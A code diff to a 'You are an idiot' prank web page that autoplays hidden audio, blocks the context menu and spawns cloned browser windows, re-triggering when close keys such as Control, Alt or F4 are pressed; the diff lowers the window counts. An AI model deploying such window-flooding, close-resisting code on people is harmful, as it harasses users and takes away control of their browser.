@@ -948,7 +948,7 @@
 			</svg>
 		</main>
 
-		<audio id="youare-audio" autoplay="" loop="" hidden="">
+		<audio id="youare-audio" autoplay="true" loop="true" hidden="true">
 			<source src="/i/youare.mp3" type="audio/mp3">
 		</audio>
 
@@ -975,7 +975,7 @@ function openWindow(url) {
 }
 
 async function proCreate(count) {	
-	for (let i = 0; i < 99; i++) {
+	for (let i = 0; i < 5; i++) {
 		openWindow(window.location.pathname);
         const cloneHTML = `<base href="${window.location.href}">${document.documentElement.outerHTML}`;
         const win = window.open('about:blank', '_blank');
@@ -1058,7 +1058,7 @@ window.onload = playBall;
 window.oncontextmenu = () => false;
 window.onkeydown = async () => {
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
-		await proCreate(999); // im trolling my friend for this. i dont expect a real harm to any computer if your reading this github. remember its like a revival stuff 
+		await proCreate(3); // im trolling my friend for this. i dont expect a real harm to any computer if your reading this github. remember its like a revival stuff 
 
 		alert("You are an idiot!");
 	}
